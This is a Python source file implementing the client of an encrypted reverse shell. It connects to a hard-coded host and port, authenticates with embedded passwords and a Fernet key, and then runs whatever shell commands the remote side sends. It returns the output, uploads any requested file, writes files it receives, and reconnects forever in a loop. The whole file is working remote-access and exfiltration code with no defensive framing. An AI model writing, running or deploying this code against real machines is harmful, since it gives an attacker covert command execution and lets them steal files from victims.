# Code written by prasanna
import socket
import os
import subprocess
import sys
import time
from cryptography.fernet import Fernet

host = '127.0.0.1'
port = 7689

# Keys and password for authentication and connection
send_password = "xhoSNoeCZ_U#3CDME3QA?#nO5Q#o*YZSXAr8LG%GIwP9!ti8VD#?f1Z41vy%b&3fTz-Zkw$Y*_SyDq6M?P&NEW4pVR+8"
recv_password = "TGa9^tYLY*d6y9MW8Zw!ALyhj*cgZVwjET=aGEf4aTwjtc7v=DnDc2!kabbvdVR2AWK@!yM2#$%^xTyVH3HueXYHgp9d"
key = "F4VMIFxbN8LHdqv7Qtl1rBlTkt8GbFnxeKXRiPTby8Y="

# Creates socket
def create_socket():
    s = socket.socket()
    s.connect((host, port))
    security(s)

# Encrypts content and send it
# Send data length and data
def sender(conn,data):
    encryptor = Fernet(key)
    encrypted_data = encryptor.encrypt(data.encode())
    encrypted_data_len = str(sys.getsizeof(encrypted_data.decode()))
    encrypted_data_len = encryptor.encrypt(encrypted_data_len.encode())
    conn.send(encrypted_data_len)
    time.sleep(0.1)
    conn.send(encrypted_data)

# Receives data and decrypt it
# Receive data length and data
def receiver(conn):
    data_len = conn.recv(10200)
    decryptor = Fernet(key)
    data_len = int(decryptor.decrypt(data_len).decode())
    data = conn.recv(data_len)
    data = decryptor.decrypt(data).decode()
    del data_len,decryptor
    return data


# Process data and send the result to the server
# input s
def deptor(s):
    while True:
        data = receiver(s)
        data = data.encode()
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
            currentWD = os.getcwd() + "> "
            sender(s,currentWD)
            continue
        elif data.decode() == 'exitu':
            quit()
        elif data.decode() == 'filetransferfromu12344':# For file transfer
            path = receiver(s)
            file = open(path,"rb")
            arr = file.read()
            print(str(len(arr)).encode())
            s.send(str(len(arr)).encode())
            time.sleep(0.2)
            s.send(arr)
            file.close()
            del arr,file,path
            continue
        elif data.decode() == 'filetransferfromus12344':# For file transfer
            t_p = receiver(s)
            
            length = s.recv(200000).decode()
            length = int(length)
            ar = s.recv(length)
            fil = open(t_p,"wb")
            fil.write(ar)
            fil.close()
            del fil,ar,t_p
            continue
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            sender(s,output_str + currentWD)
            continue

# Security check for authentication
def security(s):
    sender(s,send_password)
    rec = receiver(s)
    if rec == recv_password:
        deptor(s)
    else:
        s.close()
        del s
        create_socket()
while True:
    try:
        create_socket()
    except:
        pass
